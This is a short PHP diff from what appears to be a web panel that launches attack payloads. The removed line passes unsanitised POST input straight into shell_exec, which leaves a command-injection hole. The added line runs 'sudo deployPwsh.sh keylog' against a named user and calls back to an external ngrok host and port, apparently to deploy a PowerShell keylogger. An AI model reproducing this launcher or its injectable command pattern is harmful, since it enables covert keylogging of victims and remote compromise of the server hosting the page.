@@ -14,10 +14,11 @@ if ($result->num_rows > 0) {
         $port = $row['CurrentPort'];
     }
 }else{
-    echo "0 reuslts";
+    echo "ERROR";
 }
-
-echo(shell_exec("./deployPwsh.sh ".$_POST['attack']." ".$ip." ".$port));
+# this works now
+$command ="sudo /var/www/html/deployPwsh.sh keylog testUser1 7.tcp.eu.ngrok.io 15082";
+echo (shell_exec($command));
 ?>
 </pre>
 </html>
